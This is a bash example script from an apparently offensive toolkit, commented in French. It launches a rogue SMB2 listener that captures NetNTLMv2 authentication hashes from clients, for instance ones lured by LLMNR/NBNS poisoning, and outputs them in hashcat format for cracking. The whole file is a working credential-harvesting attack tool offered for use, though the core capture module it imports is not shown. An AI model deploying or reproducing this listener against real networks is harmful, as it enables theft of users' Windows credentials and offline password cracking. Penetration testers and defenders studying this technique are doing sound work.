#!/usr/bin/env bash
#
# examples/smb_capture_ntlm.sh - Listener SMB2 capture NetNTLMv2
#
# Lance un serveur SMB2 minimal sur le port specifie et capture les
# authentifications NTLM des clients qui s'y connectent (ex: via poisoning
# LLMNR/NBNS). Sort les hashes en format hashcat mode 5600.
#
# Usage :
#   bash examples/smb_capture_ntlm.sh [options] <bind_ip>
#
# Options :
#   -p, --port      <port>      Port d'ecoute (defaut : 445, necessite root)
#   -c, --challenge <hex8B>     Challenge NTLM fixe (defaut : 1122334455667788)
#   -o, --output    <fichier>   Fichier de sortie hashcat (defaut : stdout)
#
# Exemples :
#   sudo bash examples/smb_capture_ntlm.sh 0.0.0.0
#   bash examples/smb_capture_ntlm.sh -p 1445 192.168.1.100
#   bash examples/smb_capture_ntlm.sh -p 1445 -o hashes.txt 192.168.1.100
#
# ─────────────────────────────────────────────────────────────────────────────

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../ensh.sh"

ensh::import server/smb/ntlm

# ── Arguments ─────────────────────────────────────────────────────────────────

PORT=445
CHALLENGE="1122334455667788"
OUTPUT=""

_args=()
while (( $# > 0 )); do
    case "$1" in
        -p|--port)      PORT="$2";      shift 2 ;;
        -c|--challenge) CHALLENGE="$2"; shift 2 ;;
        -o|--output)    OUTPUT="$2";    shift 2 ;;
        *) _args+=("$1"); shift ;;
    esac
done

BIND_IP="${_args[0]:-}"

if [[ -z "${BIND_IP}" ]]; then
    printf 'Usage : %s [options] <bind_ip>\n' "$0" >&2
    printf '\nOptions :\n' >&2
    printf '  -p <port>        Port ecoute (defaut: 445)\n' >&2
    printf '  -c <challenge>   Challenge hex 8 octets\n' >&2
    printf '  -o <fichier>     Sortie hashcat\n' >&2
    exit 1
fi

# ── Callback : copie vers fichier de sortie si -o specifie ───────────────────

_on_capture() {
    local user="$1" domain="$2" hash="$3"
    [[ -n "${OUTPUT}" ]] && printf '%s\n' "${hash}" >> "${OUTPUT}"
}

# ── Lancement ─────────────────────────────────────────────────────────────────

printf '[*] Demarrage listener SMB2 sur %s:%s\n' "${BIND_IP}" "${PORT}"
printf '[*] Challenge : %s\n' "${CHALLENGE}"
[[ -n "${OUTPUT}" ]] && printf '[*] Sortie hashcat : %s\n' "${OUTPUT}"
printf '[*] Ctrl+C pour arreter\n\n'

if ! smb::server::start "${BIND_IP}" "${PORT}" "${CHALLENGE}" "_on_capture"; then
    printf '[!] Echec demarrage - port %s accessible ?\n' "${PORT}" >&2
    exit 1
fi

trap 'smb::server::stop; printf "\n[*] Arrete.\n"; exit 0' INT TERM

# Attendre indefiniment
while true; do
    sleep 5
    # Afficher les nouvelles captures depuis le log
    if [[ -n "${_SMB_SRV_CAPTURE_LOG:-}" && -s "${_SMB_SRV_CAPTURE_LOG}" ]]; then
        cat "${_SMB_SRV_CAPTURE_LOG}"
        > "${_SMB_SRV_CAPTURE_LOG}"
    fi
done
